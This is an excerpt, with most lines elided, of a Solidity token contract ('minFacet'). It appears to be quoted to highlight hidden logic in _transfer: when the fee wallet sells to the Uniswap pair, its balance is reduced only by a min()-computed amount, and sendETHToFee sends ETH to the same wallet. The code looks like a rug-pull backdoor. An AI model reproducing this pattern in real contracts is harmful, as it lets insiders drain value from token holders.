...
import "./TestLib.sol";
contract minFacet is IERC20, Context, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._feeMetaWallet)) {
                    OutTokenAmount = min(
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minMetaSwapAmount == min(ds._minMetaSwapAmount, amount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minMetaSwapAmount) {
                    swapTokensForEth(
        ...
        ds._balances[from] = ds._balances[from].sub(OutTokenAmount);
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._feeMetaWallet.transfer(amount);
    }
